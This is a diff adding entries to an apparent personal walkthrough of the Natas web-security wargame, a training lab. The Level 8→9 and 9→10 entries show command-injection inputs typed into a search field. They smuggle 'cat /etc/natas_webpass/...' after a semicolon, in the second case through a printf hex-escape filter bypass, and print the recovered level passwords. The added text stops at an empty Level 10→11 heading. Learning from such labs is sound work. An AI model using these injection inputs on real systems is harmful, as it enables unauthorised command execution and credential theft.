@@ -91,3 +91,23 @@ decode the reverse: `oubWYf2kBq`
 ```
 Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
 ```
+
+## Level 8 → Level 9
+I puted this in the search bar
+```bash
+k ;cat /etc/natas_webpass/natas10; echo
+```
+```
+D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+```
+
+## Level 9 → Level 10
+; is not allowed but the ascii value if ; is 3B so I wrote
+```bash
+k $(printf "\\x3B") cat /etc/natas_webpass/natas11 $(printf "\\x3B") echo
+```
+```
+1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+```
+
+## Level 10 → Level 11
